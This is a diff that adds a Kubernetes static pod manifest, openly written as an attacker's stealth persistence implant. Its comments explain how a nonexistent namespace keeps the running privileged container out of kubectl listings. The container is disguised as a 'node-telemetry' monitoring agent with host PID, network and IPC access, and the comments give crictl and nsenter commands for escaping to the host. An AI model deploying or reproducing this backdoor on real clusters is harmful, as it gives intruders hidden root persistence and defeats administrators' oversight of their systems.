@@ -1,0 +1,44 @@
+# "INVISIBLE POD" — camouflaged STATIC POD manifest.
+#
+# Drop this file into /etc/kubernetes/manifests/ on the target node. kubelet
+# runs the container LOCALLY regardless of the namespace; it only *mirrors*
+# the pod to the API server — and here the namespace deliberately does NOT
+# exist, so the mirror is rejected (404) and NO Pod object ever appears:
+#   kubectl get pods -A          # => nothing (container is still running!)
+#
+# Because there's no Pod object, kubectl exec does NOT work either — talk to
+# the container via crictl on the host (we have host root anyway):
+#   crictl ps | grep node-telemetry
+#   crictl exec -it <container-id> bash
+#   nsenter -t 1 -a bash         # full host PID/net/mount escape
+#
+# Masquerades as a routine "node-telemetry" agent; privileged+hostPID+
+# hostIPC+hostNetwork is the exact shape of legit monitoring/log agents.
+#
+# Deploy from an escaped host-root shell:
+#   cp node-telemetry.yaml /etc/kubernetes/manifests/
+#   # kubelet starts it within ~1s; invisible in the API
+# Remove:
+#   rm /etc/kubernetes/manifests/node-telemetry.yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: node-telemetry
+  # Intentionally NONEXISTENT namespace → kubelet can't mirror the pod →
+  # invisible pod. Pick any name that will never be created.
+  namespace: kube-node-telemetry
+  labels:
+    app: node-telemetry
+    component: monitoring
+    part-of: observability
+spec:
+  hostPID: true
+  hostNetwork: true
+  hostIPC: true
+  containers:
+  - name: agent
+    image: ubuntu:22.04
+    imagePullPolicy: IfNotPresent
+    command: ["/bin/bash", "-c", "while true; do sleep 3600; done"]
+    securityContext:
+      privileged: true
